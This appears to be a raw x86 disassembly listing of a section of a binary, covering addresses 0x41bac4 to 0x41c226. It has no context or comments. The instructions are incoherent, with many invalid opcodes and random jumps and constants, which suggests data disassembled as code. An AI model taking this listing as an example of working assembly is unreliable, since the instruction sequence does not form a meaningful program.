  41bac4:	fcom   DWORD PTR [edx-0x28]
  41bac7:	jb     0x41baa2
  41bac9:	fidivr DWORD PTR [edx]
  41bacb:	adc    cl,BYTE PTR [ecx+0x1afb9186]
  41bad1:	add    DWORD PTR [edi-0x64],0xe7458352
  41bad8:	push   ds
  41bad9:	gs jge 0x41bb45
  41badc:	mov    ebx,0x761549a6
  41bae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bae2:	inc    ecx
  41bae3:	dec    ecx
  41bae4:	es pusha 
  41bae6:	fcomp  QWORD PTR [ebp+0x1c330c16]
  41baec:	rcl    BYTE PTR [eax],cl
  41baee:	std    
  41baef:	lea    ebx,[ebx+0x6e5cbbcc]
  41baf5:	xchg   edi,eax
  41baf6:	ins    DWORD PTR es:[edi],dx
  41baf7:	into   
  41baf8:	pop    edx
  41baf9:	sbb    DWORD PTR [eax-0x7afcc9e8],edx
  41baff:	sar    BYTE PTR [esi-0x63],0x3a
  41bb03:	mov    esi,0xa5b3c2e1
  41bb08:	fild   QWORD PTR [ecx+0x75]
  41bb0b:	fimul  DWORD PTR [ebx]
  41bb0d:	inc    ebp
  41bb0e:	cdq    
  41bb0f:	lods   al,BYTE PTR ds:[esi]
  41bb10:	popa   
  41bb11:	les    esi,FWORD PTR [ecx+edi*4+0x5755b2d8]
  41bb18:	loop   0x41bb09
  41bb1a:	pusha  
  41bb1b:	in     eax,0x81
  41bb1d:	out    dx,al
  41bb1e:	loope  0x41bb6a
  41bb20:	repnz mov ds:0x678b56ce,eax
  41bb26:	and    eax,0xbe38ea39
  41bb2b:	jl     0x41bb77
  41bb2d:	push   esi
  41bb2e:	sti    
  41bb2f:	popf   
  41bb30:	(bad)  
  41bb31:	out    0x4e,eax
  41bb33:	int    0x9f
  41bb35:	pusha  
  41bb36:	(bad)  
  41bb37:	xor    BYTE PTR [ecx+edi*2+0x2],dh
  41bb3b:	xchg   edi,eax
  41bb3c:	and    ch,BYTE PTR [eax-0x5d4d3380]
  41bb42:	mov    WORD PTR [ecx+0x2c],?
  41bb45:	mov    al,0xb0
  41bb47:	mov    ds:0x65c860b1,eax
  41bb4c:	push   0x38
  41bb4e:	iret   
  41bb4f:	jp     0x41baf5
  41bb51:	xchg   ebx,eax
  41bb52:	push   es
  41bb53:	dec    esp
  41bb54:	push   esp
  41bb55:	push   0x3965dc21
  41bb5a:	cld    
  41bb5b:	jmp    0x41bb8e
  41bb5d:	lods   al,BYTE PTR ds:[esi]
  41bb5e:	int    0xbd
  41bb60:	or     al,0x5
  41bb62:	push   esp
  41bb63:	test   DWORD PTR [edi-0x2d060afc],ebx
  41bb69:	pop    eax
  41bb6a:	sbb    edx,edi
  41bb6c:	sub    eax,0x8371410e
  41bb71:	pop    ebx
  41bb72:	sbb    al,0x5f
  41bb74:	(bad)  
  41bb75:	lea    edx,[ebx-0x4c]
  41bb78:	push   ecx
  41bb79:	cmp    edi,DWORD PTR [edx]
  41bb7b:	add    BYTE PTR ds:0x9b949a52,ch
  41bb81:	add    esi,ecx
  41bb83:	fucomp st(4)
  41bb85:	adc    BYTE PTR [esi-0x3c5409c],ch
  41bb8b:	ror    BYTE PTR [esi],1
  41bb8d:	push   ss
  41bb8e:	or     esp,DWORD PTR [ebx+0x67]
  41bb91:	cmp    BYTE PTR [eax-0x17f3087b],dl
  41bb97:	cmc    
  41bb98:	jae    0x41bb72
  41bb9a:	inc    edi
  41bb9b:	mov    edx,0xdf53a6b8
  41bba0:	ret    0x64c
  41bba3:	fnstsw WORD PTR [esi-0x3b1e6c7]
  41bba9:	mov    eax,ds:0x7b7641ac
  41bbae:	imul   ebx,DWORD PTR [ebx],0xfffffffe
  41bbb1:	cmp    eax,0xf3cef21
  41bbb6:	scas   al,BYTE PTR es:[edi]
  41bbb7:	pop    ds
  41bbb8:	(bad)  
  41bbba:	and    edx,DWORD PTR [ecx]
  41bbbc:	xchg   esi,eax
  41bbbd:	(bad)  
  41bbbe:	(bad)  
  41bbbf:	loop   0x41bb7e
  41bbc1:	pop    esp
  41bbc2:	pop    esp
  41bbc3:	je     0x41bb54
  41bbc5:	xchg   DWORD PTR [esi-0x7e],edx
  41bbc8:	dec    ebp
  41bbc9:	(bad)  
  41bbca:	dec    ecx
  41bbcb:	mov    esi,0x8e73b02b
  41bbd0:	mov    ah,0x6b
  41bbd2:	pop    edx
  41bbd3:	sbb    ch,ch
  41bbd5:	rcl    ch,cl
  41bbd7:	cmp    eax,0x3c73c919
  41bbdc:	xlat   BYTE PTR ds:[ebx]
  41bbdd:	mov    dh,bl
  41bbdf:	push   cs
  41bbe0:	and    ebp,edi
  41bbe2:	sub    bh,BYTE PTR [eax*1-0x2458c71c]
  41bbe9:	jae    0x41bc3e
  41bbeb:	nop
  41bbec:	les    esi,FWORD PTR [eax-0x406bc6f4]
  41bbf2:	xor    eax,0x9ca8a33d
  41bbf7:	inc    ebx
  41bbf8:	jge    0x41bbe1
  41bbfa:	test   BYTE PTR [edx+0x21],bh
  41bbfd:	and    ecx,DWORD PTR [ebx-0x68d76ad]
  41bc03:	div    BYTE PTR [ebp+0x781a93be]
  41bc09:	push   edi
  41bc0a:	lock call 0x641a:0x64ecb108
  41bc12:	call   0xe2e54eac
  41bc17:	or     bl,BYTE PTR [edi+0x63]
  41bc1a:	add    BYTE PTR [ebx+ebp*8+0x6cef174d],bl
  41bc21:	arpl   WORD PTR [edi+edx*8-0x41f0bc64],sp
  41bc28:	(bad)  
  41bc2a:	cmp    al,0xad
  41bc2c:	add    esp,edi
  41bc2e:	es in  al,dx
  41bc30:	ror    DWORD PTR [edi+edx*4-0x5f1c29fc],0xac
  41bc38:	lock mov edi,0xa8067ab6
  41bc3e:	cmc    
  41bc3f:	test   al,0xa7
  41bc41:	inc    eax
  41bc42:	je     0x41bc4a
  41bc44:	and    BYTE PTR [edx-0x3fa2a044],cl
  41bc4a:	mov    bl,0x5e
  41bc4c:	sub    eax,0x20569e83
  41bc51:	leave  
  41bc52:	add    al,0x31
  41bc54:	pop    ecx
  41bc55:	cmp    BYTE PTR [esi-0x4d249869],0x39
  41bc5c:	das    
  41bc5d:	int3   
  41bc5e:	loope  0x41bcce
  41bc60:	mov    al,0xe4
  41bc62:	inc    ebp
  41bc63:	and    bl,BYTE PTR [eax+ebx*1]
  41bc66:	jno    0x41bcba
  41bc68:	sbb    eax,0x7e7cff77
  41bc6d:	pop    es
  41bc6e:	test   BYTE PTR [ecx+0x240f7198],dh
  41bc74:	and    BYTE PTR [esi-0x4ebbe4cd],dh
  41bc7a:	mov    esp,0x3e98b66a
  41bc7f:	cmp    DWORD PTR [eax-0x3a],esi
  41bc82:	(bad)  
  41bc83:	retf   
  41bc84:	xor    dl,BYTE PTR [edi+0x72]
  41bc87:	data16 jb 0x41bc33
  41bc8a:	xchg   ebx,eax
  41bc8b:	xchg   esp,eax
  41bc8c:	push   ds
  41bc8d:	dec    edi
  41bc8e:	imul   edi,DWORD PTR [ebp-0xb],0xf7f03975
  41bc95:	sbb    esi,DWORD PTR [ecx]
  41bc97:	pop    ds
  41bc98:	cmc    
  41bc99:	mov    dl,0xe4
  41bc9b:	popa   
  41bc9c:	jge    0x41bcb9
  41bc9e:	xchg   BYTE PTR [edi],dh
  41bca0:	jne    0x41bcc5
  41bca2:	xor    BYTE PTR [edx],0x36
  41bca5:	mov    dl,0xff
  41bca7:	xchg   BYTE PTR [ebx],ah
  41bca9:	mov    dl,0xb6
  41bcab:	pop    ss
  41bcac:	jnp    0x41bc9a
  41bcae:	cdq    
  41bcaf:	clc    
  41bcb0:	int    0x52
  41bcb2:	sub    edi,DWORD PTR ds:[edi]
  41bcb5:	xchg   DWORD PTR ds:0xd1083bff,esi
  41bcbb:	cld    
  41bcbc:	push   ss
  41bcbd:	shl    BYTE PTR [ebx],1
  41bcbf:	jg     0x41bcb3
  41bcc1:	(bad)
  41bcc5:	out    0x73,eax
  41bcc7:	sbb    ecx,DWORD PTR ds:[esi+0x24053338]
  41bcce:	out    0x41,eax
  41bcd0:	jmp    0x22f5:0xe18d4d6f
  41bcd7:	fmul   st(1),st
  41bcd9:	jo     0x41bd23
  41bcdb:	or     ah,BYTE PTR [eax+edx*1-0x38]
  41bcdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bce0:	stos   BYTE PTR es:[edi],al
  41bce1:	cld    
  41bce2:	fs int 0x21
  41bce5:	dec    edi
  41bce6:	mov    al,0x52
  41bce8:	mov    ah,0x95
  41bcea:	shl    ecx,0x8f
  41bced:	mov    ds:0x42481063,al
  41bcf2:	ja     0x41bc79
  41bcf4:	out    0xa1,eax
  41bcf6:	adc    dl,0x8c
  41bcf9:	call   0xfeed1b3
  41bcfe:	sbb    al,0x50
  41bd00:	jp     0x41bcd1
  41bd02:	jns    0x41bceb
  41bd04:	adc    eax,0xbd768bac
  41bd09:	sub    bl,BYTE PTR [edx]
  41bd0b:	cmc    
  41bd0c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41bd0e:	adc    eax,0xd280be24
  41bd13:	adc    esi,edi
  41bd15:	arpl   WORD PTR [esp+edx*2-0x54],bp
  41bd19:	fadd   QWORD PTR [esi]
  41bd1b:	inc    esp
  41bd1c:	fwait
  41bd1d:	mov    ah,0x3b
  41bd1f:	mov    esi,0xc435e7a9
  41bd24:	call   0xb237985d
  41bd29:	sahf   
  41bd2a:	inc    edx
  41bd2b:	mov    ebx,0x595c028e
  41bd30:	adc    DWORD PTR ds:0x1e8b3ecf,edx
  41bd36:	int3   
  41bd37:	retf   
  41bd38:	outs   dx,BYTE PTR ds:[esi]
  41bd39:	jb     0x41bd36
  41bd3b:	xchg   esi,eax
  41bd3d:	outs   dx,DWORD PTR ds:[esi]
  41bd3e:	sub    BYTE PTR [edx+0x1a],ch
  41bd41:	in     eax,0x7a
  41bd43:	fucom  st(6)
  41bd45:	pop    eax
  41bd46:	cmp    BYTE PTR [ebx],al
  41bd48:	add    ebp,DWORD PTR [edi+esi*2+0x58]
  41bd4c:	push   cs
  41bd4d:	mov    cl,0xdd
  41bd4f:	adc    DWORD PTR [edi+0x3b],esi
  41bd52:	int3   
  41bd53:	jae    0x41bd40
  41bd55:	push   0xfffffff9
  41bd57:	enter  0x96aa,0xa6
  41bd5b:	sbb    eax,0x49b18d89
  41bd60:	add    eax,0x433e7d95
  41bd65:	xor    eax,0xaeb7c9a9
  41bd6a:	add    al,0x74
  41bd6c:	icebp  
  41bd6d:	xchg   esi,eax
  41bd6e:	jecxz  0x41bd17
  41bd70:	loope  0x41bdc9
  41bd72:	dec    eax
  41bd73:	and    DWORD PTR [edi+0x56a97a1f],0xeba8e33
  41bd7d:	inc    ebx
  41bd7e:	ret    
  41bd7f:	(bad)  
  41bd80:	rcr    BYTE PTR [ebx-0x2e],cl
  41bd83:	sub    DWORD PTR [ebp-0x5c],0x927f57c3
  41bd8a:	leave  
  41bd8b:	leave  
  41bd8c:	lock sub BYTE PTR [edx+0x64],0x0
  41bd91:	mov    bh,0x7
  41bd93:	mov    esp,0xe6f284ce
  41bd98:	add    al,0x1
  41bd9a:	sub    al,0xc6
  41bd9c:	sbb    al,0x42
  41bd9e:	inc    eax
  41bd9f:	outs   dx,BYTE PTR ds:[esi]
  41bda0:	jl     0x41bdaf
  41bda2:	icebp  
  41bda3:	add    eax,0x147762a8
  41bda8:	inc    esp
  41bda9:	arpl   WORD PTR [edx-0x6f521968],bp
  41bdaf:	(bad)  
  41bdb0:	sub    al,0x9b
  41bdb2:	adc    BYTE PTR [ecx-0x6d],cl
  41bdb5:	fisubr WORD PTR [esi+esi*2]
  41bdb8:	sbb    eax,0xfb5022f5
  41bdbd:	mov    bl,0x25
  41bdbf:	repnz dec ebx
  41bdc1:	imul   ecx,DWORD PTR [edi+edx*4-0x302f4150],0xffffffa4
  41bdc9:	mov    esi,0xf892bea4
  41bdce:	repz sbb al,0xf5
  41bdd1:	push   ebx
  41bdd2:	and    DWORD PTR [esi-0x1e2b99e5],esi
  41bdd8:	xchg   ebp,eax
  41bdd9:	xchg   esi,eax
  41bdda:	pushf  
  41bddb:	stc    
  41bddc:	call   0x9438:0x5bfec19b
  41bde3:	add    edi,esi
  41bde5:	outs   dx,DWORD PTR ds:[esi]
  41bde6:	jecxz  0x41be0c
  41bde8:	mov    ebp,0x2cb6cec7
  41bded:	inc    eax
  41bdee:	push   edi
  41bdef:	xor    dh,BYTE PTR [edi-0x6f91aca9]
  41bdf5:	pusha  
  41bdf6:	pushf  
  41bdf7:	cmp    edx,DWORD PTR [eax-0x10]
  41bdfa:	add    cl,BYTE PTR [ecx+0x183e8542]
  41be00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be01:	mov    BYTE PTR [esi-0x8],bh
  41be04:	and    al,0x64
  41be06:	cwde   
  41be07:	outs   dx,BYTE PTR ds:[esi]
  41be08:	push   ebp
  41be09:	and    DWORD PTR [eax+eiz*1],ebp
  41be0c:	jle    0x41bd8e
  41be0e:	cmp    BYTE PTR [eax+0x252d4e0d],dh
  41be14:	mov    WORD PTR [eax+0x2b2f9830],es
  41be1a:	int3   
  41be1b:	push   cs
  41be1c:	jl     0x41be83
  41be1e:	mov    ah,0xba
  41be20:	dec    eax
  41be21:	add    eax,0xe66debd4
  41be26:	or     al,dl
  41be28:	mov    dl,0x5a
  41be2a:	sub    al,0xcd
  41be2c:	fisttp DWORD PTR [edi+0x7edf5edd]
  41be32:	sbb    eax,ebp
  41be34:	call   0x19a7:0x6f6ee1b1
  41be3b:	lea    eax,[ebp-0x56c9f083]
  41be41:	jmp    0x41bec0
  41be43:	xchg   BYTE PTR [eax+0x35],bl
  41be46:	xor    DWORD PTR [ebp-0x6a],ecx
  41be49:	mov    al,ds:0xbd5052e4
  41be4e:	stos   DWORD PTR es:[edi],eax
  41be4f:	adc    eax,0x986642d0
  41be54:	mov    bl,0xe7
  41be56:	and    al,0x4
  41be58:	(bad)  
  41be59:	sub    al,0xb
  41be5b:	dec    ebx
  41be5c:	push   esp
  41be5d:	or     eax,0xed1f3a49
  41be62:	das    
  41be63:	(bad)  
  41be64:	mov    dl,0x48
  41be66:	fxch   st(3)
  41be68:	jns    0x41bea7
  41be6a:	sub    edx,DWORD PTR [ecx+0x1d339d2f]
  41be70:	xchg   edi,ebp
  41be72:	into   
  41be73:	(bad)  
  41be75:	lock mov ?,eax
  41be78:	out    dx,al
  41be79:	mov    esi,0x8a7f99b5
  41be7e:	icebp  
  41be7f:	sub    edi,DWORD PTR [edi]
  41be81:	test   BYTE PTR [ecx-0x13eba599],bl
  41be87:	push   ebx
  41be88:	ins    BYTE PTR es:[edi],dx
  41be89:	pop    ebp
  41be8a:	pop    esp
  41be8b:	out    0xc0,al
  41be8d:	outs   dx,BYTE PTR ds:[esi]
  41be8e:	jl     0x41bea0
  41be90:	int3   
  41be91:	aaa    
  41be92:	push   0x20b11194
  41be97:	pop    esi
  41be98:	ss add ebp,edi
  41be9b:	cmp    bl,BYTE PTR [ebp+0x58e65ed6]
  41bea1:	xchg   esp,eax
  41bea2:	div    DWORD PTR [ebx-0x35e6e2f1]
  41bea8:	xchg   esp,eax
  41bea9:	stos   BYTE PTR es:[edi],al
  41beaa:	xchg   ebp,eax
  41beab:	(bad)  
  41beac:	dec    ebp
  41bead:	cli    
  41beae:	or     DWORD PTR [eax+0x68c0fbf7],esp
  41beb4:	cmp    eax,0xcea5f927
  41beb9:	and    esi,edi
  41bebb:	ins    DWORD PTR es:[edi],dx
  41bebc:	ret    
  41bebd:	test   BYTE PTR [edi-0x1a2874f4],ah
  41bec3:	in     eax,0x1a
  41bec5:	lea    ecx,[edx-0x8]
  41bec8:	fld    DWORD PTR ds:0xaa66ffb9
  41bece:	test   al,0xa3
  41bed0:	(bad)  
  41bed1:	fiadd  WORD PTR [ecx+edx*8-0x7d95036a]
  41bed9:	leave  
  41beda:	xchg   ebp,eax
  41bedb:	imul   BYTE PTR [edi]
  41bedd:	stc    
  41bede:	test   al,0x31
  41bee0:	outs   dx,DWORD PTR ds:[esi]
  41bee1:	lods   al,BYTE PTR ds:[esi]
  41bee2:	mov    edi,0xe8173600
  41bee7:	mov    esi,0x8840e9c9
  41beec:	mov    al,0x72
  41beee:	xchg   edi,eax
  41beef:	les    ebx,FWORD PTR [esi-0x80]
  41bef2:	lods   al,BYTE PTR ds:[esi]
  41bef3:	retf   0xe9a4
  41bef6:	adc    eax,ecx
  41bef8:	jb     0x41bef0
  41befa:	lods   al,BYTE PTR ds:[esi]
  41befb:	cmp    BYTE PTR [eax+eax*1-0x2b21e421],ch
  41bf02:	shr    BYTE PTR [ecx-0x7],1
  41bf05:	sub    bh,BYTE PTR [eax+0x8654012]
  41bf0b:	imul   eax,DWORD PTR [ebx+0x2f8168c6],0xffffff88
  41bf12:	jnp    0x41befc
  41bf14:	mov    DWORD PTR [edi+0x3c],esp
  41bf17:	mov    gs:0x27d01107,eax
  41bf1d:	adc    eax,DWORD PTR [edi+0x3]
  41bf20:	jns    0x41bf40
  41bf22:	std    
  41bf23:	xchg   ebx,eax
  41bf24:	shl    DWORD PTR [esi],cl
  41bf26:	test   eax,0xff6db8c9
  41bf2b:	rep ss stos DWORD PTR es:[edi],eax
  41bf2e:	dec    eax
  41bf2f:	mov    ch,0xc
  41bf31:	aaa    
  41bf32:	adc    al,0x45
  41bf34:	push   esp
  41bf35:	aaa    
  41bf36:	cmp    eax,0x7a49a5b1
  41bf3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3c:	fld    TBYTE PTR [ebx]
  41bf3e:	push   edx
  41bf3f:	jle    0x41bf25
  41bf41:	or     BYTE PTR [esi],ah
  41bf43:	xchg   esi,eax
  41bf44:	cmp    DWORD PTR [esp+edi*4],edi
  41bf47:	leave  
  41bf48:	mov    ebx,0x3eb8554a
  41bf4d:	outs   dx,BYTE PTR ds:[esi]
  41bf4e:	dec    ecx
  41bf4f:	mov    bl,0x2b
  41bf51:	scas   eax,DWORD PTR es:[edi]
  41bf52:	dec    eax
  41bf53:	pop    ebx
  41bf54:	loop   0x41bfc6
  41bf56:	xor    BYTE PTR [edi+0x16],dl
  41bf59:	mov    gs,WORD PTR [bx+di-0x42]
  41bf5d:	or     DWORD PTR [esi+0x46],ebx
  41bf60:	in     al,0x7a
  41bf62:	test   eax,0x9e86db0a
  41bf67:	sbb    DWORD PTR [esi+0x8],edi
  41bf6a:	mov    ebx,0xc15dc243
  41bf6f:	pop    ecx
  41bf70:	stc    
  41bf71:	in     al,dx
  41bf72:	or     eax,0xa73a480f
  41bf77:	xor    cl,BYTE PTR [edx+0x45]
  41bf7a:	xor    BYTE PTR [ebx],0x2e
  41bf7d:	xchg   ecx,eax
  41bf7e:	repz aad 0x46
  41bf81:	out    dx,al
  41bf82:	pop    eax
  41bf83:	add    eax,0xe1d34c68
  41bf88:	test   BYTE PTR [edi],0x4a
  41bf8b:	push   edi
  41bf8c:	aad    0x41
  41bf8e:	or     DWORD PTR [ebx-0x1df05e60],ebx
  41bf94:	mov    ecx,0x53c60669
  41bf99:	gs inc esp
  41bf9b:	mov    dl,0xa0
  41bf9d:	les    eax,FWORD PTR [eax+0x31780efa]
  41bfa3:	dec    eax
  41bfa4:	cmp    eax,0xe6267c36
  41bfa9:	cmp    cl,bl
  41bfab:	adc    eax,0xe65f20b4
  41bfb0:	push   edi
  41bfb1:	pop    ebp
  41bfb2:	ja     0x41bf66
  41bfb4:	es es out dx,al
  41bfb7:	bound  ebx,QWORD PTR [edi+0xf]
  41bfba:	or     DWORD PTR [edx+0x1],eax
  41bfbd:	icebp  
  41bfbe:	mov    dh,0x1b
  41bfc0:	inc    ecx
  41bfc1:	cld    
  41bfc2:	fwait
  41bfc3:	ret    0x5003
  41bfc6:	push   ss
  41bfc7:	bound  esi,QWORD PTR [edi]
  41bfc9:	mov    BYTE PTR [ebx],ch
  41bfcb:	jae    0x41bf8f
  41bfcd:	xchg   bl,al
  41bfcf:	sub    DWORD PTR [ebp+0x11],edx
  41bfd2:	xchg   edx,eax
  41bfd3:	rcr    BYTE PTR [esi+0xd124873],0x90
  41bfda:	xchg   esp,eax
  41bfdb:	sahf   
  41bfdc:	inc    ebp
  41bfdd:	xor    eax,DWORD PTR [ebx+0x4a]
  41bfe0:	adc    eax,0x9e9cf90d
  41bfe5:	jmp    FWORD PTR [ecx+0x4d4335d3]
  41bfeb:	sbb    ebx,DWORD PTR [eax-0x75dd3f84]
  41bff1:	mov    WORD PTR [ecx-0x4c],ds
  41bff4:	mov    BYTE PTR [ecx],al
  41bff6:	jns    0x41bff1
  41bff8:	sub    ecx,ebx
  41bffa:	dec    ebx
  41bffb:	inc    esi
  41bffc:	cdq    
  41bffd:	mov    dl,0x7b
  41bfff:	icebp  
  41c000:	popa   
  41c001:	les    eax,FWORD PTR [eax+esi*1]
  41c004:	push   ds
  41c005:	jmp    0x41c072
  41c007:	adc    al,0x1f
  41c009:	stos   BYTE PTR es:[edi],al
  41c00a:	or     eax,0x1a9bd54d
  41c00f:	cli    
  41c010:	hlt    
  41c011:	lods   al,BYTE PTR ds:[esi]
  41c012:	ds pushf 
  41c014:	in     eax,dx
  41c015:	and    eax,0x5f2f177f
  41c01a:	add    ecx,0x63
  41c01d:	out    dx,eax
  41c01e:	stc    
  41c01f:	repnz sub al,0xca
  41c022:	sub    BYTE PTR [ecx-0x5b],0xf9
  41c026:	mov    al,ds:0xf0c35122
  41c02b:	lods   al,BYTE PTR ds:[esi]
  41c02c:	std    
  41c02d:	aas    
  41c02e:	adc    DWORD PTR [eax],ebp
  41c030:	pop    es
  41c031:	push   eax
  41c032:	mov    ah,0xed
  41c034:	aaa    
  41c035:	dec    esp
  41c036:	(bad)  
  41c037:	not    dh
  41c039:	mov    ecx,0x8ace7f54
  41c03e:	mov    DWORD PTR [edx+edi*4-0x6dce5f45],esp
  41c045:	(bad)  
  41c046:	cld    
  41c047:	xlat   BYTE PTR ds:[ebx]
  41c048:	push   esp
  41c049:	add    eax,0x32ee609f
  41c04e:	add    eax,DWORD PTR [ebp+eax*4+0x3568e4b8]
  41c055:	into   
  41c056:	mov    eax,0x8604629f
  41c05b:	and    dl,cl
  41c05d:	adc    al,0x6
  41c05f:	cmc    
  41c060:	cli    
  41c061:	les    eax,FWORD PTR [edi+0x52]
  41c064:	or     DWORD PTR [edx],ebx
  41c066:	das    
  41c067:	das    
  41c068:	adc    al,0xd
  41c06a:	popf   
  41c06b:	cmp    BYTE PTR [edi],bl
  41c06d:	jae    0x41c081
  41c06f:	and    al,0x70
  41c071:	pop    ss
  41c072:	mov    ah,0xd2
  41c074:	shr    BYTE PTR [edi-0x5e48ea3e],0x90
  41c07b:	ins    DWORD PTR es:[edi],dx
  41c07c:	xchg   BYTE PTR [ebx+0x123cd54e],al
  41c082:	or     DWORD PTR [esi-0xdad9948],esi
  41c088:	cmp    eax,0xc3b45bd0
  41c08d:	retf   
  41c08e:	mov    ds:0xb1a1ea82,al
  41c093:	cli    
  41c094:	(bad)  
  41c095:	(bad)  
  41c096:	cli    
  41c097:	adc    DWORD PTR [edi],ebp
  41c099:	outs   dx,DWORD PTR ds:[esi]
  41c09a:	xchg   ebp,eax
  41c09b:	adc    DWORD PTR [ebx],0x51
  41c09e:	xchg   ebp,eax
  41c09f:	sbb    edx,edi
  41c0a1:	mov    fs,WORD PTR [ebx+0xaeb1f51]
  41c0a7:	ss ror dh,1
  41c0aa:	in     al,dx
  41c0ab:	stc    
  41c0ac:	rol    BYTE PTR [eax-0x6f642707],0x96
  41c0b3:	and    eax,0xfe36b4fa
  41c0b8:	xlat   BYTE PTR ds:[ebx]
  41c0b9:	dec    ecx
  41c0ba:	push   ebp
  41c0bb:	int3   
  41c0bc:	jae    0x41c064
  41c0be:	mul    bh
  41c0c0:	popf   
  41c0c1:	cdq    
  41c0c2:	jb     0x41c075
  41c0c4:	inc    edx
  41c0c5:	add    dh,bl
  41c0c7:	fild   DWORD PTR ds:0xa8bb3329
  41c0cd:	xchg   ecx,eax
  41c0ce:	out    0x63,eax
  41c0d0:	or     dl,BYTE PTR [ebp+0x15]
  41c0d3:	addr16 inc edi
  41c0d5:	dec    esi
  41c0d6:	inc    ecx
  41c0d7:	or     esp,DWORD PTR [edi+edx*4-0x66]
  41c0db:	cmp    esp,eax
  41c0dd:	inc    esi
  41c0de:	xchg   BYTE PTR [esi+0x5],ah
  41c0e1:	push   0xdae4ed47
  41c0e6:	pop    ebx
  41c0e7:	les    esi,FWORD PTR [edi+0x458f5ee8]
  41c0ed:	cli    
  41c0ee:	inc    ebp
  41c0ef:	and    al,0x37
  41c0f1:	mov    dh,0xec
  41c0f3:	icebp  
  41c0f4:	or     esp,esi
  41c0f6:	dec    ebx
  41c0f7:	outs   dx,BYTE PTR ds:[esi]
  41c0f8:	pop    ebx
  41c0f9:	ds in  eax,0x5f
  41c0fc:	and    cl,dh
  41c0fe:	pop    ss
  41c0ff:	ins    DWORD PTR es:[edi],dx
  41c100:	inc    ebx
  41c101:	ds mov ecx,eax
  41c104:	pop    eax
  41c105:	jae    0x41c134
  41c107:	add    ebx,DWORD PTR [ebp-0x7c]
  41c10a:	out    0x1e,al
  41c10c:	xlat   BYTE PTR ds:[ebx]
  41c10d:	dec    esp
  41c10e:	xchg   edi,eax
  41c10f:	fcomp  DWORD PTR [esi]
  41c111:	mov    edi,0xdca5cb34
  41c116:	cmp    eax,0x4107515c
  41c11b:	lahf   
  41c11c:	and    BYTE PTR [ebp+ecx*4+0x7fd91f4b],cl
  41c123:	add    DWORD PTR [edx+0x2],edx
  41c126:	sbb    BYTE PTR [ebx+0x11],ch
  41c129:	or     al,0xea
  41c12b:	jb     0x41c121
  41c12d:	mov    ?,ecx
  41c12f:	and    ebp,DWORD PTR [edi]
  41c131:	xchg   esp,eax
  41c132:	mov    WORD PTR [eax-0x14],ss
  41c135:	adc    bh,BYTE PTR [eax]
  41c137:	sbb    esi,esp
  41c139:	pop    ds
  41c13a:	adc    bl,BYTE PTR [ecx-0x7]
  41c13d:	out    0x34,eax
  41c13f:	cld    
  41c140:	xor    BYTE PTR [eax-0x36],ch
  41c143:	mov    ds:0xa395d29a,al
  41c148:	sub    al,0xd9
  41c14a:	pop    ecx
  41c14b:	scas   eax,DWORD PTR es:[edi]
  41c14c:	mov    bh,0xff
  41c14e:	int    0xf1
  41c150:	cdq    
  41c151:	into   
  41c152:	out    dx,al
  41c153:	iret   
  41c154:	push   esi
  41c155:	das    
  41c156:	adc    DWORD PTR [edx+eiz*1+0x6d],esp
  41c15a:	test   al,0x85
  41c15c:	cwde   
  41c15d:	mov    ah,0x91
  41c15f:	mov    ch,bl
  41c161:	fs lock loop 0x41c1b8
  41c165:	mov    ch,0x17
  41c167:	push   esp
  41c168:	push   edi
  41c169:	inc    esp
  41c16a:	adc    edx,esi
  41c16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c16d:	(bad)  
  41c16e:	in     eax,dx
  41c16f:	loope  0x41c129
  41c171:	push   ebx
  41c172:	adc    al,0x7e
  41c174:	test   DWORD PTR [eax-0x459eee8a],ebx
  41c17a:	dec    ebp
  41c17b:	es cdq 
  41c17d:	adc    DWORD PTR [eax-0x72cce984],ebp
  41c183:	xchg   edi,eax
  41c184:	pusha  
  41c185:	out    0x13,al
  41c187:	fwait
  41c188:	or     DWORD PTR [esi-0x7087b71],esp
  41c18e:	or     eax,0xaf5f06c5
  41c193:	jmp    0x5573e8c3
  41c198:	mov    cl,BYTE PTR [edx+edi*4+0x5f2b304e]
  41c19f:	je     0x41c124
  41c1a1:	xchg   DWORD PTR ds:0xccd0353f,edx
  41c1a7:	jno    0x41c159
  41c1a9:	and    dx,WORD PTR [ebx+0x47]
  41c1ad:	leave  
  41c1ae:	jl     0x41c209
  41c1b0:	outs   dx,BYTE PTR ds:[esi]
  41c1b1:	mov    ecx,0x513f5a21
  41c1b6:	or     ebp,DWORD PTR [esi+0x66cc1c43]
  41c1bc:	(bad)  
  41c1bd:	xchg   edi,eax
  41c1be:	push   es
  41c1bf:	shl    DWORD PTR [ecx+eax*2-0x3f],1
  41c1c3:	xor    dh,BYTE PTR [esi-0x76cf7a0f]
  41c1c9:	or     ebx,ecx
  41c1cb:	(bad)  
  41c1cc:	jp     0x41c21a
  41c1ce:	and    dh,dl
  41c1d0:	xchg   edi,eax
  41c1d1:	scas   al,BYTE PTR es:[edi]
  41c1d2:	fisub  WORD PTR [eax+0x667cf3e1]
  41c1d8:	stos   BYTE PTR es:[edi],al
  41c1d9:	dec    edx
  41c1da:	sub    eax,0xcd25e9f3
  41c1df:	and    ebp,DWORD PTR [ebp-0x70]
  41c1e2:	dec    eax
  41c1e3:	outs   dx,BYTE PTR ds:[esi]
  41c1e4:	sbb    al,0x17
  41c1e6:	xchg   DWORD PTR [edi-0x60a1733a],eax
  41c1ec:	xor    BYTE PTR [esi+0x2b37c7e2],dh
  41c1f2:	adc    cl,BYTE PTR ss:[ecx-0x251706f3]
  41c1f9:	xor    eax,0x90dc63c3
  41c1fe:	loope  0x41c1c1
  41c200:	in     eax,dx
  41c201:	pop    ebx
  41c202:	sub    ah,ch
  41c204:	out    0x6d,al
  41c206:	clc    
  41c207:	out    dx,eax
  41c208:	xchg   esp,eax
  41c209:	add    al,0x4
  41c20b:	pop    esi
  41c20c:	or     DWORD PTR [esi-0x13],ecx
  41c20f:	gs adc al,0x64
  41c212:	pop    esi
  41c213:	fwait
  41c214:	jae    0x41c25d
  41c216:	rcr    BYTE PTR [eax-0x2a],0x88
  41c21a:	push   ecx
  41c21b:	xchg   esi,eax
  41c21c:	jae    0x41c1b4
  41c21e:	jmp    FWORD PTR [ebp+0x61c93b4e]
  41c224:	in     eax,0x4
  41c226:	int3   
